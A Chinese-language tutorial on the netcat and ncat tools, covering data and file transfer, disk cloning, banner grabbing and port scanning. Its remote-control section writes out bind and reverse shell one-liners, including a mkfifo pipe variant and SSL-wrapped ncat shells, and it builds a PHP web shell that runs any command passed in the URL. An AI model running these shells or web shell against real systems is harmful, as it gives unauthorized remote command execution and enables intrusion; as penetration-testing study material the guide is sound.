# NC 与 NCAT

## 0x01 NC (NETCAT)

### 功能

1. 侦听/传输模式，传输数据
2. Telnet / 获取 Banner 信息
3. 传输文本信息
4. 传输文件/目录
5. 加密传输文件
6. 远程控制 / 木马
7. 流媒体服务器
8. 远程克隆硬盘

### 基本方式 (`nc -h`)

#### 帮助

```text
root:~# nc -h
[v1.10-41.1]
connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [-options] [hostname] [port]
options:
    -c shell commands   as `-e'; use /bin/sh to exec [dangerous!!]
    -e filename         program to exec after connect [dangerous!!]
    -b                  allow broadcasts
    -g gateway          source-routing hop point[s], up to 8
    -G num              source-routing pointer: 4, 8, 12, ...
    -h                  this cruft
    -i secs             delay interval for lines sent, ports scanned
    -k                  set keepalive option on socket
    -l                  listen mode, for inbound connects
    -n                  numeric-only IP addresses, no DNS
    -o file             hex dump of traffic
    -p port             local port number
    -r                  randomize local and remote ports
    -q secs             quit after EOF on stdin and delay of secs
    -s addr             local source address
    -T tos              set Type Of Service
    -t                  answer TELNET negotiation
    -u                  UDP mode
    -v                  verbose [use twice to be more verbose]
    -w secs             timeout for connects and final net reads
    -C                  Send CRLF as line-ending
    -z                  zero-I/O mode [used for scanning]
```

!!! warning "注意"
    不同平台甚至不同 Linux 版本的 nc 可能稍有差别，曾遇到 Ubuntu 的一些版本连 `-p` 参数都用不了，只能 `nc -l port` 而不能 `nc -lp port`。

#### 文件及目录传输

```bash
# 传输文本（可以聊天）
A: nc -lp 端口           # 监听端
B: nc -nv ip 端口        # 主动连接端

# 文件传输
nc -lp 端口 > output.file
cat file | nc -nv ip 端口 -q 1
# 也可以：ps aux | nc -nv 10.1.1.12 port -q 1

# 传输硬盘信息（常用于取证，整盘或分区完整复制）
A: nc -lp 端口 | dd of=/dev/sda
B: dd if=/dev/sda | nc -nv ip 端口 -q 1

# 流媒体应用
A: nc -lp port > 1.mp4
B: nc -nv ip port < 1.mp4 -q 1
# 或
A: nc -q -lp port < a.mp4
B: nc -nv ip port > 2.mp4

# 流媒体服务
A: cat 1.mp4 | nc -lp port
B: nc -nv ip port | mplayer -vo x11 -cache 3000 -
# 或 nc -nv ip port | mpv

# 传输目录（打包后传输）
A: tar -cvf - music/ | nc -lp port -q 1
B: nc -nv ip port | tar -xvf -

# 加密传文件
A: nc -lp port | mcrypt --flush -Fbqd -a rijndael-256 -m ecb > filename
B: mcrypt --flush -Fbq -a rijndael-256 -m ecb < filename | nc -nv ip port -q 1
```

#### 用于登录 (Telnet / SMTP 等)

```bash
# 登录 POP3
nc -vn 123.125.50.29 110

# 登录 SMTP
nc -nv 123.125.20.138 25

# 获取 HTTP Banner
nc -nv ip 80
```

#### 端口扫描

```bash
# TCP 端口扫描（结果不太准确）
nc -nvz ip 1-65536

# UDP 端口扫描
nc -vnzu ip 1-1024
```

#### 远程控制

!!! info "版本差异"
    版本不同可能没有 `-c` 参数。Kali 的 nc 版本有，而 Ubuntu 的则没有。

```bash
# 正向 shell
A: nc -lp 333 -c bash
# 如果没有 -c 参数，可以这样变通：
A: mkfifo /tmp/pipe; sh /tmp/pipe | nc -nklp 4444 > /tmp/pipe
B: nc ip 333

# 反向 shell
A: nc -lp 333        # 攻击者
B: nc ip 333 -c bash

# Windows 用户把 bash 改成 cmd
```

#### 做一个简单的 Web 服务器

先创建一个文件 `cmd.php`：

```text
HTTP/1.1 200 OK
Date: Fri, 16 Feb 2018 10:20:27 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html

<?php echo shell_exec($_GET['cmd']);?>
```

然后执行：

```bash
while true; do nc -lp 80 -q 1 < cmd.php; done
```

这样就可以构造 `http://ip?cmd=command` 执行指令。

---

## 0x02 NCAT

功能上和 NC 基本相同，是 Nmap 的一个功能组件，可以当做独立工具使用。与 NC 的重要差别：

- NC 是**明文传输**，无法对连接者做控制
- NCAT 支持 **SSL 加密传输**，并且可以通过 `--allow` 限制连接者

### 使用示例

```bash
# 正向 shell（加密 + IP 白名单）
A: ncat -c bash --allow ip -vnl port --ssl
B: ncat -nv ip port --ssl

# 反向 shell
A: ncat -lp port --ssl --allow 127.0.0.1
B: ncat -nv ip port -c bash --ssl
```

### 帮助信息

```text
Usage: ncat [options] [hostname] [port]

Options taking a time assume seconds. Append 'ms' for milliseconds,
's' for seconds, 'm' for minutes, or 'h' for hours (e.g. 500ms).
  -4                         Use IPv4 only
  -6                         Use IPv6 only
  -U, --unixsock             Use Unix domain sockets only
  -C, --crlf                 Use CRLF for EOL sequence
  -c, --sh-exec <command>    Executes the given command via /bin/sh
  -e, --exec <command>       Executes the given command
      --lua-exec <filename>  Executes the given Lua script
  -g hop1[,hop2,...]         Loose source routing hop points (8 max)
  -G <n>                     Loose source routing hop pointer (4, 8, 12, ...)
  -m, --max-conns <n>        Maximum <n> simultaneous connections
  -h, --help                 Display this help screen
  -d, --delay <time>         Wait between read/writes
  -o, --output <filename>    Dump session data to a file
  -x, --hex-dump <filename>  Dump session data as hex to a file
  -i, --idle-timeout <time>  Idle read/write timeout
  -p, --source-port port     Specify source port to use
  -s, --source addr          Specify source address to use (doesn't affect -l)
  -l, --listen               Bind and listen for incoming connections
  -k, --keep-open            Accept multiple connections in listen mode
  -n, --nodns                Do not resolve hostnames via DNS
  -t, --telnet               Answer Telnet negotiations
  -u, --udp                  Use UDP instead of default TCP
      --sctp                 Use SCTP instead of default TCP
  -v, --verbose              Set verbosity level (can be used several times)
  -w, --wait <time>          Connect timeout
  -z                         Zero-I/O mode, report connection status only
      --append-output        Append rather than clobber specified output files
      --send-only            Only send data, ignoring received; quit on EOF
      --recv-only            Only receive data, never send anything
      --allow                Allow only given hosts to connect to Ncat
      --allowfile            A file of hosts allowed to connect to Ncat
      --deny                 Deny given hosts from connecting to Ncat
      --denyfile             A file of hosts denied from connecting to Ncat
      --broker               Enable Ncat's connection brokering mode
      --chat                 Start a simple Ncat chat server
      --proxy <addr[:port]>  Specify address of host to proxy through
      --proxy-type <type>    Specify proxy type ("http" or "socks4" or "socks5")
      --proxy-auth <auth>    Authenticate with HTTP or SOCKS proxy server
      --ssl                  Connect or listen with SSL
      --ssl-cert             Specify SSL certificate file (PEM) for listening
      --ssl-key              Specify SSL private key (PEM) for listening
      --ssl-verify           Verify trust and domain name of certificates
      --ssl-trustfile        PEM file containing trusted SSL certificates
      --ssl-ciphers          Cipherlist containing SSL ciphers to use
      --ssl-alpn             ALPN protocol list to use
      --version              Display Ncat's version information and exit
```
